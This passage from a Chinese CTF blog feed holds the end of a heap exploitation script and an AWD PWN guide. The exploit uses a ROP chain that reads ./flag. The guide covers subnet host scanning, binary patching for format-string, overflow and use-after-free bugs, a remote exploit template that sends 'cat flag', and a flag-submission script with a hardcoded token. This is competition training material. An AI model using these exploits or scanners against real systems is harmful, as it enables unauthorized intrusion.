class="token punctuation">(</span><span class="token number">0x4e1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x240</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>heap_base <span class="token operator">>></span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4e1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">b'\x00\x00'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x758</span> <span class="token operator">-</span> <span class="token number">0x5f0</span><span class="token punctuation">)</span>pop_rax_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000045eb0</span>pop_rdi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000002a3e5</span>pop_rsi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000002be51</span>pop_rdx_ret_r12 <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000011f497</span>syscall_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000091396</span>pay <span class="token operator">=</span> <span class="token string">b'./flag\x00\x00'</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr <span class="token operator">-</span> <span class="token number">0x300</span><span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr <span class="token operator">-</span> <span class="token number">0x300</span><span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x440</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x201</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x1f0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x301</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x440</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x201</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>heap_base <span class="token operator">>></span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>stack_addr <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x1f0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x301</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目：&lt;a href=&quot;https://github.com/0xviol1t/CTF-challenges/tree/main/2024/CISCN%E5%88%9D%E8%B5%9B/PWN&quot;&gt;https://github.com/0xviol1t/CTF-challe</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>AWD_PWN</title>
    <link href="https://starrysky1004.github.io/2024/04/26/awd-pwn/awd-pwn/"/>
    <id>https://starrysky1004.github.io/2024/04/26/awd-pwn/awd-pwn/</id>
    <published>2024-04-26T05:42:00.000Z</published>
    <updated>2024-06-03T11:30:18.930Z</updated>
    
    <content type="html"><![CDATA[<p>准备长城杯的时候练习了两周<code>awd</code>，注意力全放在<code>pwn</code>了，可惜最后没有<code>pwn</code>，全程坐牢去了…写一篇<code>awd</code>的<code>pwn</code>脚本和推荐工具吧，感谢<a href="https://www.z1r0.top/">z1r0</a>师傅的脚本和<code>cheny</code>师傅找的一些工具</p><p>视频讲解版：<a href="https://www.bilibili.com/video/BV1Fx4y1r7n2">https://www.bilibili.com/video/BV1Fx4y1r7n2</a></p><h2 id="扫描IP"><a href="#扫描IP" class="headerlink" title="扫描IP"></a>扫描IP</h2><h3 id="init-hosts-py"><a href="#init-hosts-py" class="headerlink" title="init_hosts.py"></a>init_hosts.py</h3><p>例：<a href="http://192-168-1-x.awd.bugku.cn/">http://192-168-1-X.awd.bugku.cn</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingli <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check_ip</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'http://192-168-1-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">.awd.bugku.cn/'</span></span> <span class="token comment">#*</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            li<span class="token punctuation">(</span><span class="token string">'[+] '</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'hosts'</span><span class="token punctuation">,</span> <span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'192-168-1-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">.awd.bugku.cn:9999\n'</span></span><span class="token punctuation">)</span> <span class="token comment">#*</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Not 200 OK"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        ll<span class="token punctuation">(</span><span class="token string">'[-] '</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'192-168-1-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">.awd.bugku.cn:9999\n'</span></span><span class="token punctuation">)</span> <span class="token comment">#*</span>NUM_THREADS <span class="token operator">=</span> <span class="token number">256</span>threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>check_ip<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>thread<span class="token punctuation">)</span>    thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>threads<span class="token punctuation">)</span> <span class="token operator">>=</span> NUM_THREADS<span class="token punctuation">:</span>        <span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>            t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>        threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>    t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul><li><p>工具</p><ul><li><p><code>IDA</code></p></li><li><p>加沙箱：<a href="https://github.com/TTY-flag/evilPatcher#/">https://github.com/TTY-flag/evilPatcher#/</a></p></li><li><p><a href="https://github.com/aftern00n/AwdPwnPatcher#/">https://github.com/aftern00n/AwdPwnPatcher#/</a></p></li></ul></li><li><p>使用</p><ul><li><p>加沙箱通防</p><ul><li><code>sandboxs</code>里改禁用规则</li><li><code>python3 evil_patcher.py file_name sandboxfile</code></li></ul></li><li><p><code>IDA</code>的<code>patch</code>步骤：<code>Edit -&gt; Patch program -&gt; Apply patches to input file</code></p></li><li><p><code>AWDPwnPatcher</code>使用</p><ul><li><code>from AwdPwnPatcher import *binary = &quot;filename&quot;awd_pwn_patcher = AwdPwnPatcher(binary)</code></li><li><code>add_patch_in_ehframe(assembly=&quot;&quot;, machine_code=[])</code></li><li><code>patch_origin(start, end=0, assembly=&quot;&quot;, machine_code=[], string=&quot;&quot;)</code></li><li><code>patch_by_jmp(self, jmp_from, jmp_to=0, assembly=&quot;&quot;, machine_code=[])</code></li><li><code>patch_by_call(self, call_from, assembly=&quot;&quot;, machine_code=[])</code></li><li><code>add_constant_in_ehframe(self, string)</code></li><li><code>save(self, save_path=&quot;&quot;)</code></li></ul></li><li><p>格式化字符串漏洞</p><ul><li><p><code>32</code>位</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> AwdPwnPatcher <span class="token keyword">import</span> <span class="token operator">*</span>binary <span class="token operator">=</span> <span class="token string">"filename"</span>awd_pwn_patcher <span class="token operator">=</span> AwdPwnPatcher<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>awd_pwn_patcher<span class="token punctuation">.</span>patch_fmt_by_call<span class="token punctuation">(</span>address<span class="token punctuation">)</span>  <span class="token comment">#call printf地址</span>awd_pwn_patcher<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>64</code>位</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> AwdPwnPatcher <span class="token keyword">import</span> <span class="token operator">*</span>binary <span class="token operator">=</span> <span class="token string">"filename"</span>awd_pwn_patcher <span class="token operator">=</span> AwdPwnPatcher<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>fmt_offset <span class="token operator">=</span> awd_pwn_patcher<span class="token punctuation">.</span>add_constant_in_ehframe<span class="token punctuation">(</span><span class="token string">"%s\\x00\\x00"</span><span class="token punctuation">)</span>  <span class="token comment">#添加%s</span>assembly <span class="token operator">=</span> <span class="token triple-quoted-string string">"""mov rsi, qword ptr [rbp-0x8]lea rdi, qword ptr [&#123;&#125;]"""</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>fmt_offset<span class="token punctuation">)</span><span class="token punctuation">)</span>awd_pwn_patcher<span class="token punctuation">.</span>patch_by_jmp<span class="token punctuation">(</span><span class="token number">0x706</span><span class="token punctuation">,</span> jmp_to<span class="token operator">=</span><span class="token number">0x712</span><span class="token punctuation">,</span> assembly<span class="token operator">=</span>assembly<span class="token punctuation">)</span>    <span class="token comment">#改printf，mov rax地址和call printf地址</span>awd_pwn_patcher<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>栈溢出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> AwdPwnPatcher <span class="token keyword">import</span> <span class="token operator">*</span>binary <span class="token operator">=</span> <span class="token string">"filename"</span>awd_pwn_patcher <span class="token operator">=</span> AwdPwnPatcher<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>assembly <span class="token operator">=</span> <span class="token triple-quoted-string string">'''push 0x20   #缩小输入范围，控制寄存器push进去的值'''</span>awd_pwn_patcher<span class="token punctuation">.</span>patch_origin<span class="token punctuation">(</span><span class="token number">0x8048476</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token number">0x804847b</span><span class="token punctuation">,</span> assembly<span class="token operator">=</span>assembly<span class="token punctuation">)</span>   <span class="token comment">#原push地址和push的下一条地址</span>awd_pwn_patcher<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>UAF</code></p><ul><li><p><code>32</code>位</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> AwdPwnPatcher <span class="token keyword">import</span> <span class="token operator">*</span>binary <span class="token operator">=</span> <span class="token string">"./filename"</span>awd_pwn_patcher <span class="token operator">=</span> AwdPwnPatcher<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>assembly <span class="token operator">=</span> <span class="token triple-quoted-string string">"""add esp, 0x10mov eax, 0mov edx, dword ptr [ebp - 0x20]mov eax, 0x804a060  #被释放的地址lea eax, dword ptr [eax + edx*4]mov dword ptr [eax], 0"""</span>awd_pwn_patcher<span class="token punctuation">.</span>patch_by_jmp<span class="token punctuation">(</span><span class="token number">0x80485bf</span><span class="token punctuation">,</span> jmp_to<span class="token operator">=</span><span class="token number">0x80485c7</span><span class="token punctuation">,</span> assembly<span class="token operator">=</span>assembly<span class="token punctuation">)</span>    <span class="token comment">#call free地址和下一条地址</span>awd_pwn_patcher<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>64</code>位</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> AwdPwnPatcher <span class="token keyword">import</span> <span class="token operator">*</span>binary <span class="token operator">=</span> <span class="token string">"./filename"</span>awd_pwn_patcher <span class="token operator">=</span> AwdPwnPatcher<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>assembly <span class="token operator">=</span> <span class="token triple-quoted-string string">"""mov eax, 0mov eax, dword ptr [rbp - 0x1c]cdqelea rdx, qword ptr [0x201040]lea rax, qword ptr [rdx + rax*8]mov qword ptr [rax], 0"""</span>awd_pwn_patcher<span class="token punctuation">.</span>patch_by_jmp<span class="token punctuation">(</span><span class="token number">0x838</span><span class="token punctuation">,</span> jmp_to<span class="token operator">=</span><span class="token number">0x83d</span><span class="token punctuation">,</span> assembly<span class="token operator">=</span>assembly<span class="token punctuation">)</span>awd_pwn_patcher<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><code>gets</code> 栈溢出</p><p>只有<code>gets</code>函数能够接受用户输入时，将流程劫持到<code>.eh_frame</code>段，利用<code>syscall</code>构造<code>read</code>函数，就能控制输入数据的长度。</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.eh_frame:0000000000400F7D mov     rax, 0          ;#define __NR_read 0.eh_frame:0000000000400F84 mov     rdi, 0          ; fd.eh_frame:0000000000400F8B lea     rsi, [rbp+buf]  ; buf.eh_frame:0000000000400F8E mov     rdx, 90h        ; count.eh_frame:0000000000400F95 syscall.eh_frame:0000000000400F97 jmp     loc_400AB4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>负数绕过：输入负数<code>-1</code>也满足<code>jle</code>，修复方法：将<code>JLE</code>改为<code>JBE</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">cmp     eax, 20hjle     short loc_8048777<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li></ul><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># A script for awd exp</span><span class="token keyword">import</span> os<span class="token keyword">import</span> sys<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write_to_flags</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">:</span>    fd <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flags'</span><span class="token punctuation">,</span> <span class="token string">'ab'</span><span class="token punctuation">)</span>    fd<span class="token punctuation">.</span>write<span class="token punctuation">(</span>d <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>    fd<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>ip <span class="token operator">=</span> server_ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">#exp</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'cat flag'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'&#123;'</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">b'viol1t&#123;'</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'&#125;'</span><span class="token punctuation">)</span>write_to_flags<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="submit-flag-py"><a href="#submit-flag-py" class="headerlink" title="submit_flag.py"></a>submit_flag.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># A script for awd loop submit flag</span><span class="token keyword">import</span> threading<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">import</span> os<span class="token keyword">import</span> json<span class="token keyword">import</span> requestsflag_file <span class="token operator">=</span> <span class="token string">'./flags'</span>threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># url = 'https://ctf.bugku.com/awd/submit.html?token=88b02ce3b420ec1f4b4a2e02dd6fe305&amp;flag=' + flag[:-1]</span>        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"curl -X POST http://27.25.152.77:19999/api/flag -H 'Authorization: 7f120ca9b0e3024d06734a04a986cc55' -d '&#123;&#123; \"flag\": \"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">-1]</span><span class="token punctuation">&#125;</span></span><span class="token string">\"&#125;&#125;'"</span></span>        <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token comment"># r = requests.get(url)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m[+] pwned!\x1b[0m'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m[-] connect fail: &#123;&#125;\x1b[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>flag_file<span class="token punctuation">)</span> <span class="token keyword">as</span> flag_txt<span class="token punctuation">:</span>        flags <span class="token operator">=</span> flag_txt<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> flag <span class="token 